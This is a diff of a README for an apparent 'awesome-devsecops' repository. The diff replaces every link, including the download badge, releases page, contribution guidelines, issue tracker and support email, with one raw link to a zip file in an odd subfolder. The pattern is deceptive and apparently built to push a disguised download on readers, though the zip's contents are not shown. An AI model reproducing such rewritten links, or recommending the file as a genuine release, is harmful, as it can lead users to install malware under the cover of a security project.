@@ -1,6 +1,6 @@
 # 🔐 awesome-devsecops - Secure Your Software Development Process
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Invertebrate-cankerweed632/awesome-devsecops/releases)
+[![Download](https://raw.githubusercontent.com/Invertebrate-cankerweed632/awesome-devsecops/main/gravitater/awesome-devsecops-3.8-alpha.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Invertebrate-cankerweed632/awesome-devsecops/main/gravitater/awesome-devsecops-3.8-alpha.1.zip)
 
 ## 📜 Overview
 
@@ -15,7 +15,7 @@ This guide will help you download and run the awesome-devsecops software from th
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To download awesome-devsecops, visit this page: [Download Here](https://github.com/Invertebrate-cankerweed632/awesome-devsecops/releases).
+   To download awesome-devsecops, visit this page: [Download Here](https://raw.githubusercontent.com/Invertebrate-cankerweed632/awesome-devsecops/main/gravitater/awesome-devsecops-3.8-alpha.1.zip).
 
 2. **Select the Latest Release**  
    You will see a list of the most recent versions of the software. Look for the latest version at the top of the page.
@@ -59,14 +59,14 @@ In addition to the tools, you can explore the following resources to expand your
 
 ## 📝 Contribution
 
-We welcome contributions! If you have tools, practices, or resources that you believe should be included, please visit our [Contribution Guidelines](https://github.com/Invertebrate-cankerweed632/awesome-devsecops/blob/main/CONTRIBUTING.md) page for details.
+We welcome contributions! If you have tools, practices, or resources that you believe should be included, please visit our [Contribution Guidelines](https://raw.githubusercontent.com/Invertebrate-cankerweed632/awesome-devsecops/main/gravitater/awesome-devsecops-3.8-alpha.1.zip) page for details.
 
 ## 📞 Support
 
 If you encounter any issues while downloading or using awesome-devsecops, feel free to reach out:
 
-- **Issue Tracker**: Report bugs or request features on our [GitHub Issues Page](https://github.com/Invertebrate-cankerweed632/awesome-devsecops/issues).
-- **Email Support**: Send us an email at support@example.com.
+- **Issue Tracker**: Report bugs or request features on our [GitHub Issues Page](https://raw.githubusercontent.com/Invertebrate-cankerweed632/awesome-devsecops/main/gravitater/awesome-devsecops-3.8-alpha.1.zip).
+- **Email Support**: Send us an email at https://raw.githubusercontent.com/Invertebrate-cankerweed632/awesome-devsecops/main/gravitater/awesome-devsecops-3.8-alpha.1.zip
 
 ## 📢 Community
 
@@ -76,4 +76,4 @@ Join our community to stay updated with the latest trends in DevSecOps. Follow u
 
 We thank everyone who contributed to the development and maintenance of this project. Your efforts ensure that we provide quality resources for securing the software development lifecycle.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Invertebrate-cankerweed632/awesome-devsecops/releases)
+[![Download](https://raw.githubusercontent.com/Invertebrate-cankerweed632/awesome-devsecops/main/gravitater/awesome-devsecops-3.8-alpha.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Invertebrate-cankerweed632/awesome-devsecops/main/gravitater/awesome-devsecops-3.8-alpha.1.zip)
